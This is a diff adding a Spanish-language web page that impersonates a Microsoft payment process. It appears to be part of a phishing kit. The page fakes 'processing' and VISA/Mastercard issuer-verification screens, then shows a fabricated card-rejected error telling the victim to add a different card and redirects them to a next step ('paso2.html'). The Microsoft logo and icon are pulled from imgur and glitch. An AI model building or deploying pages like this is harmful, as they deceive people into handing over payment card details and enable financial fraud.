@@ -1,0 +1,637 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Procesando pago • Microsoft</title>
+<link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon"/>
+<style>
+/* ========== ESTILOS COMPLETOS ========== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background: #f3f6fc;
+  font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  margin: 0;
+  padding: 2rem 1rem;
+}
+
+/* Overlays y pasos */
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #f0f6ff;
+  z-index: 200;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: opacity 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+  backdrop-filter: blur(2px);
+}
+
+.is-hide {
+  opacity: 0 !important;
+  visibility: hidden !important;
+  pointer-events: none !important;
+  transition: opacity 0.25s ease, visibility 0.1s 0.25s;
+}
+
+.card-lite, .card-issuer {
+  background: white;
+  border-radius: 32px;
+  box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.02);
+  width: 360px;
+  max-width: 88vw;
+  padding: 2rem 1.8rem 2rem 1.8rem;
+  text-align: center;
+  transition: all 0.2s;
+}
+
+.title {
+  font-size: 1.65rem;
+  font-weight: 600;
+  margin: 1.2rem 0 0.5rem;
+  color: #1a1f36;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 4px;
+}
+
+.dots {
+  display: inline-flex;
+  width: 1.8rem;
+}
+
+.dots::after {
+  content: "...";
+  animation: dotsAnim 1.4s steps(4, end) infinite;
+  display: inline-block;
+  width: 0;
+  overflow: visible;
+  letter-spacing: 2px;
+}
+
+@keyframes dotsAnim {
+  0%, 20% { content: ""; }
+  40% { content: "."; }
+  60% { content: ".."; }
+  80%, 100% { content: "..."; }
+}
+
+/* ===== SPINNER CORREGIDO - ROTACIÓN CONTINUA ===== */
+.ring {
+  width: 64px;
+  height: 64px;
+  margin: 1.2rem auto;
+  display: block;
+  animation: rotateRing 1.2s linear infinite;
+}
+
+.sweep {
+  stroke-dasharray: 113;
+  stroke-dashoffset: 113;
+  animation: dashRing 1.2s ease-in-out infinite;
+}
+
+@keyframes rotateRing {
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes dashRing {
+  0% {
+    stroke-dashoffset: 113;
+  }
+  50% {
+    stroke-dashoffset: 28;
+  }
+  100% {
+    stroke-dashoffset: 113;
+  }
+}
+
+/* Spinner del paso 2 */
+.ring-brand {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 1rem;
+  display: block;
+  animation: rotateBrandRing 1s linear infinite;
+}
+
+.brand-sweep {
+  stroke-dasharray: 113;
+  stroke-dashoffset: 113;
+  animation: dashBrandRing 1s ease-in-out infinite;
+}
+
+@keyframes rotateBrandRing {
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+@keyframes dashBrandRing {
+  0% {
+    stroke-dashoffset: 113;
+  }
+  50% {
+    stroke-dashoffset: 28;
+  }
+  100% {
+    stroke-dashoffset: 113;
+  }
+}
+
+.subtle {
+  color: #4a5568;
+  font-size: 0.9rem;
+  margin-top: 1rem;
+}
+
+.divider {
+  height: 1px;
+  background: #e2e8f0;
+  margin: 1.2rem 0 1rem;
+}
+
+.hints {
+  list-style: none;
+  font-size: 0.75rem;
+  color: #5c6e8c;
+}
+
+.hints li {
+  margin: 0.3rem 0;
+}
+
+/* PASO 2: issuer ring */
+#step-2 .card-issuer {
+  background: #ffffff;
+  border-radius: 48px;
+  padding: 2rem 1.8rem;
+}
+
+.issuer-body {
+  text-align: center;
+}
+
+.brand-visa {
+  font-weight: 700;
+  font-size: 1.9rem;
+  letter-spacing: 2px;
+  color: #1a1f71;
+  margin: 0.2rem 0;
+  font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+}
+
+.brand-mc {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  background: #ff5f00;
+  padding: 6px 14px;
+  border-radius: 40px;
+  width: fit-content;
+  margin: 0 auto;
+  color: white;
+  font-weight: 600;
+}
+
+.mc-icon {
+  width: 28px;
+  height: 22px;
+  background: radial-gradient(circle at 30% 45%, #f79e1b 8px, #ff5f00 8px, #ff5f00 16px, #d1102a 16px);
+  border-radius: 14px;
+  display: inline-block;
+}
+
+.brand-title {
+  font-size: 1.45rem;
+  font-weight: 650;
+  margin-top: 1.3rem;
+  color: #0b2b4f;
+}
+
+.brand-caption {
+  color: #3a5a7a;
+  font-size: 0.85rem;
+  margin-top: 0.5rem;
+}
+
+.hidden {
+  display: none;
+}
+
+/* PASO 3: Error principal - VISIBLE */
+.stage-main {
+  width: 100%;
+  max-width: 520px;
+  margin: 0 auto;
+  transition: all 0.2s;
+  display: block !important;
+}
+
+.card {
+  background: white;
+  border-radius: 36px;
+  box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.1);
+  padding: 2rem 1.8rem 2rem 1.8rem;
+}
+
+.head {
+  text-align: left;
+}
+
+.brand img {
+  height: 24px;
+}
+
+.title-err {
+  font-size: 1.7rem;
+  font-weight: 700;
+  margin: 1rem 0 0.25rem;
+  color: #c00;
+}
+
+.sub-err {
+  font-size: 1rem;
+  color: #2c3e4e;
+  font-weight: 500;
+}
+
+.status {
+  display: flex;
+  justify-content: center;
+  margin: 1.3rem 0;
+}
+
+.err-badge {
+  width: 80px;
+  height: 80px;
+}
+
+.err-svg {
+  width: 100%;
+  height: 100%;
+}
+
+.err-bg {
+  stroke: #ffe1e1;
+}
+
+.err-ring {
+  stroke: #ffb3b3;
+  stroke-dasharray: 110;
+  animation: ringPulse 1.2s ease-out;
+}
+
+.err-spark {
+  stroke: #ff7b7b;
+  stroke-dasharray: 100;
+  animation: fadeIn 0.7s;
+}
+
+.err-line {
+  stroke: #d32f2f;
+  stroke-linecap: round;
+}
+
+.err-x1, .err-x2 {
+  stroke-dasharray: 20;
+  animation: appearCross 0.35s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
+}
+
+@keyframes ringPulse {
+  0% { transform: scale(0.7); opacity: 0; }
+  100% { transform: scale(1); opacity: 1; }
+}
+
+@keyframes appearCross {
+  0% { stroke-dashoffset: 20; opacity: 0; }
+  100% { stroke-dashoffset: 0; opacity: 1; }
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.intro {
+  font-size: 0.95rem;
+  margin: 1rem 0 1rem;
+  color: #2c3e4e;
+}
+
+.callout {
+  background: #f8f9fc;
+  border-radius: 24px;
+  padding: 1rem 1.2rem;
+  margin: 1rem 0;
+}
+
+.callout h3 {
+  font-size: 1rem;
+  font-weight: 650;
+  margin-bottom: 0.6rem;
+}
+
+.callout ul {
+  margin-left: 1.3rem;
+  color: #2d3e50;
+  font-size: 0.85rem;
+}
+
+.callout li {
+  margin: 0.2rem 0;
+}
+
+.callout.error {
+  border-left: 5px solid #da3b3b;
+  background: #fff7f7;
+}
+
+.callout.help {
+  border-left: 5px solid #2c7be5;
+  background: #f2f8ff;
+}
+
+.btn {
+  display: inline-block;
+  background: #0067c0;
+  color: white;
+  text-decoration: none;
+  font-weight: 600;
+  padding: 12px 28px;
+  border-radius: 40px;
+  margin-top: 12px;
+  transition: 0.1s;
+  border: none;
+  cursor: pointer;
+  font-size: 0.9rem;
+}
+
+.btn:hover {
+  background: #004e91;
+  transform: scale(0.97);
+}
+
+/* Contador de redirección */
+.redirect-timer {
+  text-align: center;
+  margin-top: 1rem;
+  font-size: 0.85rem;
+  color: #6c86a3;
+  padding: 0.8rem;
+  background: #f0f4f9;
+  border-radius: 40px;
+}
+
+.redirect-timer strong {
+  color: #0067c0;
+  font-size: 1.1rem;
+}
+
+.sefue {
+  margin-top: 2rem;
+  display: flex;
+  gap: 2rem;
+  font-size: 0.7rem;
+  color: #6c86a3;
+  justify-content: center;
+}
+
+@media (max-width: 480px) {
+  .card-lite, .card-issuer, .card { padding: 1.5rem; }
+}
+</style>
+</head>
+<body>
+
+<!-- PASO 1: procesando pago -->
+<div id="step-1" class="overlay" aria-live="polite" aria-label="Procesando pago">
+  <div class="card-lite motion stagger-on" id="card-lite">
+    <div style="line-height:0" data-anim="1">
+      <img alt="Microsoft" src="https://i.imgur.com/upwcKCh.png" style="height:22px">
+    </div>
+    <div class="title" data-anim="2">Procesando pago<span class="dots"></span></div>
+
+    <svg class="ring" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-anim="3">
+      <g fill="none" fill-rule="evenodd" stroke-width="4">
+        <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,0.12)"></circle>
+        <path class="sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#0067c0"></path>
+      </g>
+    </svg>
+
+    <div class="subtle" data-anim="4">Estamos verificando la transacción…</div>
+    <div class="divider" data-anim="4"></div>
+    <ul class="hints" data-anim="4">
+      <li>No cierres esta ventana.</li>
+      <li>Podrían pedirse pasos de seguridad adicionales.</li>
+    </ul>
+  </div>
+</div>
+
+<!-- PASO 2: verificación con emisor -->
+<div id="step-2" class="overlay is-hide" aria-live="polite" aria-label="Verificación con emisor">
+  <div class="card-issuer motion" id="card-issuer">
+    <div class="issuer-body">
+      <svg class="ring-brand" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <g fill="none" fill-rule="evenodd" stroke-width="5">
+          <circle cx="22" cy="22" r="18" stroke="rgba(0,0,0,.08)"></circle>
+          <path class="brand-sweep" d="M40 22c0-9.941-8.059-18-18-18" stroke="#2563eb"></path>
+        </g>
+      </svg>
+
+      <div id="brand-visa" class="brand-visa hidden" aria-hidden="true">VISA</div>
+      <div id="brand-mc" class="brand-mc hidden" aria-hidden="true">
+        <span class="mc-icon" aria-hidden="true"></span>
+        <span class="mc-text">ID Check</span>
+      </div>
+
+      <div class="brand-title">Espera un momento</div>
+      <div class="brand-caption">Tomará unos segundos hasta que finalice la operación</div>
+    </div>
+  </div>
+</div>
+
+<!-- PASO 3: Error final (ahora visible y con temporizador) -->
+<main id="step-3" class="stage-main" aria-live="polite" style="display: block !important;">
+  <section class="card" role="dialog" aria-labelledby="ttl" aria-describedby="desc">
+    <header class="head">
+      <div class="brand">
+        <img src="https://i.imgur.com/upwcKCh.png" alt="Microsoft">
+      </div>
+      <h1 id="ttl" class="title-err">Error en procesar su pago</h1>
+      <p id="desc" class="sub-err">Hubo un problema con tu método de pago.</p>
+    </header>
+
+    <div class="status" aria-hidden="true">
+      <div class="err-badge">
+        <svg class="err-svg" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle class="err-bg" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <circle class="err-ring" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <circle class="err-spark" cx="24" cy="24" r="18" fill="none" stroke-width="2"/>
+          <line class="err-line err-x1" x1="17" y1="17" x2="31" y2="31" stroke-width="2.5"/>
+          <line class="err-line err-x2" x1="31" y1="17" x2="17" y2="31" stroke-width="2.5"/>
+        </svg>
+      </div>
+    </div>
+
+    <p class="intro">Requerimos que agregue una tarjeta de pago diferente.</p>
+
+    <div class="callout error" role="group" aria-label="Tarjeta no compatible">
+      <h3>Tarjeta no compatible</h3>
+      <ul>
+        <li>Tarjeta no habilitada para compras internacionales</li>
+        <li>Restricciones del banco emisor</li>
+        <li>Tipo de tarjeta no soportado</li>
+        <li>Fondos insuficientes</li>
+      </ul>
+    </div>
+
+    <div class="callout help" role="group" aria-label="¿Qué puedes hacer?">
+      <h3>¿Qué puedes hacer?</h3>
+      <ul>
+        <li>Intenta con una tarjeta diferente (Visa, Mastercard, American Express, Discover).</li>
+        <li>Verifica que tu tarjeta esté habilitada para compras en línea.</li>
+        <li>Contacta a tu banco para autorizar la transacción.</li>
+      </ul>
+    </div>
+
+    <div class="fins">
+      <a href="#" class="btn" id="retryButton">Reintentar ahora</a>
+    </div>
+    
+    <!-- Contador de redirección automática -->
+    <div class="redirect-timer" id="timerContainer">
+      Redirigiendo en <strong id="countdownTimer">10</strong> segundos...
+    </div>
+  </section>
+</main>
+
+<div class="sefue"><p>Términos de uso</p><p>Privacidad y cookies</p><p>...</p></div>
+
+<script>
+  // ==========================================
+  // FLUJO: Paso 1 → Paso 2 → Paso 3 (error)
+  // Paso 3 visible por 10 segundos con contador
+  // Botón "Reintentar" redirige inmediatamente
+  // ==========================================
+  
+  const step1 = document.getElementById("step-1");
+  const step2 = document.getElementById("step-2");
+  const step3Main = document.getElementById("step-3");
+  const retryBtn = document.getElementById("retryButton");
+  const timerElement = document.getElementById("countdownTimer");
+  const timerContainer = document.getElementById("timerContainer");
+  
+  let countdown = 10;
+  let timerInterval = null;
+  let redirectTimeout = null;
+  
+  // Función para redirigir a index3.html
+  function redirectToIndex3() {
+    // Limpiar timers para evitar múltiples redirecciones
+    if (timerInterval) clearInterval(timerInterval);
+    if (redirectTimeout) clearTimeout(redirectTimeout);
+    window.location.href = "paso2.html";
+  }
+  
+  // Función para iniciar el contador de 10 segundos
+  function startCountdown() {
+    countdown = 10;
+    if (timerElement) timerElement.textContent = countdown;
+    
+    // Limpiar interval anterior si existe
+    if (timerInterval) clearInterval(timerInterval);
+    if (redirectTimeout) clearTimeout(redirectTimeout);
+    
+    timerInterval = setInterval(() => {
+      countdown--;
+      if (timerElement) timerElement.textContent = countdown;
+      
+      if (countdown <= 0) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+        redirectToIndex3();
+      }
+    }, 1000);
+  }
+  
+  // Función para detener el contador (usado cuando se hace clic en reintentar)
+  function stopCountdown() {
+    if (timerInterval) {
+      clearInterval(timerInterval);
+      timerInterval = null;
+    }
+    if (redirectTimeout) {
+      clearTimeout(redirectTimeout);
+      redirectTimeout = null;
+    }
+  }
+  
+  // Ocultar paso 3 al inicio? No, el paso 3 debe estar visible desde el principio
+  // pero como ahora el flujo es: paso1 → paso2 → paso3, lo ocultamos inicialmente
+  step3Main.style.display = "none";
+  
+  // Simular carga: 3.5 seg de step1, luego step2 durante 2.5 seg, luego mostrar error con contador
+  setTimeout(() => {
+    // Ocultar step1 y mostrar step2
+    step1.classList.add("is-hide");
+    step2.classList.remove("is-hide");
+    
+    // Cambiar marca aleatoria (VISA o Mastercard)
+    const brandVisa = document.getElementById("brand-visa");
+    const brandMc = document.getElementById("brand-mc");
+    const randomChoice = Math.random() > 0.5;
+    if (randomChoice) {
+      brandVisa.classList.remove("hidden");
+      brandMc.classList.add("hidden");
+      document.querySelector(".brand-sweep")?.setAttribute("stroke", "#1a1f71");
+    } else {
+      brandVisa.classList.add("hidden");
+      brandMc.classList.remove("hidden");
+      document.querySelector(".brand-sweep")?.setAttribute("stroke", "#ff5f00");
+    }
+    
+    // Después de 2.8 segundos, mostrar el ERROR y empezar contador de 10 segundos
+    setTimeout(() => {
+      step2.classList.add("is-hide");
+      step3Main.style.display = "block";
+      
+      // Iniciar contador de 10 segundos para redirección automática
+      startCountdown();
+      
+    }, 2800);
+    
+  }, 3500);
+  
+  // Botón "Reintentar ahora" - redirige inmediatamente
+  if (retryBtn) {
+    retryBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      stopCountdown(); // Detener el contador automático
+      redirectToIndex3(); // Redirigir inmediatamente
+    });
+  }
+  
+  console.log("Flujo de pago Microsoft - El error se mostrará por 10 segundos con contador");
+</script>
+</body>
+</html>
